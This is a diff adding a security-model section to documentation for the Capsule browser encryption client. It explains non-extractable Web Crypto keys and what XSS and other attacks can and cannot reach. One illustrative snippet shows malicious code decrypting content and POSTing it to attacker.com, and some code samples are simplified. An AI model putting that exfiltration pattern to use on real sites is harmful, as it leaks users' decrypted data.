@@ -185,6 +185,169 @@ async function unlockTier(tier, client) {
   return dek;
 }`}</CodeBlock>
 
+      <h2>Security Model</h2>
+      
+      <h3>Private Key Protection: The Core Guarantee</h3>
+      <p>
+        The Capsule client's security foundation is that <strong>the private key cannot be 
+        extracted from the browser</strong>, even by the user or malicious JavaScript code.
+      </p>
+
+      <h4>How Non-Extractable Keys Work</h4>
+      <p>
+        When generating a key pair, the private key is stored with{" "}
+        <code>extractable: false</code>:
+      </p>
+      <CodeBlock>{`const privateKey = await crypto.subtle.importKey(
+  'jwk',
+  privateKeyJwk,
+  { name: 'RSA-OAEP', hash: 'SHA-256' },
+  false,  // NOT extractable - enforced by browser engine
+  ['unwrapKey']
+);`}</CodeBlock>
+
+      <p>This means:</p>
+      <ul>
+        <li>✅ The key can be <strong>used</strong> for unwrapping DEKs</li>
+        <li>❌ The key cannot be <strong>exported</strong> in any format (JWK, PKCS8, raw bytes)</li>
+        <li>❌ The key cannot be <strong>copied</strong> to another device or browser</li>
+        <li>❌ The key cannot be <strong>downloaded</strong> or sent to a server</li>
+      </ul>
+
+      <h4>What About IndexedDB Access?</h4>
+      <p>
+        Users and JavaScript code <strong>can access IndexedDB</strong> through DevTools or browser APIs:
+      </p>
+      <CodeBlock>{`// You CAN retrieve the key object
+const db = await indexedDB.open('capsule-keys');
+const keyPair = await db.get('keypair', 'default');
+console.log(keyPair.privateKey); 
+// Output: CryptoKey {type: "private", extractable: false, ...}
+
+// But you CANNOT export the key material
+await crypto.subtle.exportKey('jwk', keyPair.privateKey);
+// ❌ Error: "key is not extractable"
+
+await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);
+// ❌ Error: "key is not extractable"
+
+// Even this doesn't help
+JSON.stringify(keyPair.privateKey);
+// Returns: "{}" (empty object)
+
+const blob = new Blob([keyPair.privateKey]);
+// Creates: "[object CryptoKey]" (useless string)`}</CodeBlock>
+
+      <p>
+        The <code>CryptoKey</code> object in IndexedDB is just a <strong>handle</strong> or{" "}
+        <strong>reference</strong> to the actual key material, which lives in the browser's
+        secure crypto subsystem. Think of it like a key to a safe deposit box that only works
+        inside the bank - you can use it there, but you can't take the contents home.
+      </p>
+
+      <h4>Attack Vector Analysis</h4>
+      <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '1rem' }}>
+        <thead>
+          <tr>
+            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
+              Attack Type
+            </th>
+            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
+              Can Extract Key?
+            </th>
+            <th style={{ textAlign: 'left', padding: '0.5rem', borderBottom: '1px solid #ddd' }}>
+              Notes
+            </th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Server compromise</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Key never sent to server</td>
+          </tr>
+          <tr>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Network interception</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Key never transmitted</td>
+          </tr>
+          <tr>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>XSS / malicious JS</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Can use key, cannot export it</td>
+          </tr>
+          <tr>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser DevTools</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Can see object, not bytes</td>
+          </tr>
+          <tr>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Database breach</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>No server-side key storage</td>
+          </tr>
+          <tr>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>User manual export</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>❌ No</td>
+            <td style={{ padding: '0.5rem', borderBottom: '1px solid #eee' }}>Browser prevents all export methods</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p style={{ marginTop: '1rem' }}>
+        The <strong>only</strong> attack that works is using the key for its intended purpose:
+      </p>
+      <CodeBlock>{`// Malicious code CAN do this:
+const decryptedContent = await client.decryptArticle(payload);
+await fetch('https://attacker.com', { 
+  method: 'POST', 
+  body: decryptedContent  // Send decrypted content (not the key!)
+});`}</CodeBlock>
+
+      <p>
+        This is why <strong>XSS protection</strong> (Content Security Policy, input sanitization)
+        remains critical - not to protect the key itself, but to prevent unauthorized{" "}
+        <strong>use</strong> of the key.
+      </p>
+
+      <h3>Additional Security Layers</h3>
+      <ul>
+        <li><strong>DEKs in Memory Only</strong>: Unwrapped DEKs are cached in JavaScript memory 
+          (not persisted) and lost on page refresh</li>
+        <li><strong>AES-GCM Authentication</strong>: 128-bit auth tags prevent tampering with 
+          encrypted content</li>
+        <li><strong>Web Crypto API</strong>: Uses hardware-accelerated cryptography when available 
+          (TPM, Secure Enclave)</li>
+        <li><strong>Secure Context Requirement</strong>: Web Crypto API only works over HTTPS or localhost</li>
+        <li><strong>Origin Isolation</strong>: IndexedDB is bound to the origin - other websites 
+          cannot access your keys</li>
+      </ul>
+
+      <h3>What This Means for Your Application</h3>
+      <ul>
+        <li>✅ <strong>Server compromise cannot leak user keys</strong> - They're not on the server</li>
+        <li>✅ <strong>Database breach cannot decrypt content</strong> - Private keys are client-side only</li>
+        <li>✅ <strong>Network eavesdropping is ineffective</strong> - Only wrapped DEKs are transmitted</li>
+        <li>✅ <strong>Users cannot accidentally export their keys</strong> - Browser prevents it</li>
+        <li>✅ <strong>True end-to-end encryption</strong> - Only the user's browser can decrypt</li>
+      </ul>
+
+      <h3>Limitations and Trade-offs</h3>
+      <ul>
+        <li>⚠️ <strong>Key loss means data loss</strong>: If a user clears browser data or switches 
+          devices, they lose access</li>
+        <li>⚠️ <strong>No cross-device sync</strong>: Keys are tied to a single browser profile</li>
+        <li>⚠️ <strong>XSS can still abuse keys</strong>: Malicious code can decrypt content (though 
+          not steal keys)</li>
+      </ul>
+
+      <p>Consider implementing:</p>
+      <ul>
+        <li>Server-side encrypted key backup (wrapped with user password)</li>
+        <li>Multi-device key synchronization (using secure key exchange protocols)</li>
+        <li>Content Security Policy (CSP) to prevent XSS attacks</li>
+      </ul>
+
       <h2>Browser Compatibility</h2>
       <p>Capsule requires the Web Crypto API, which is available in:</p>
       <ul>
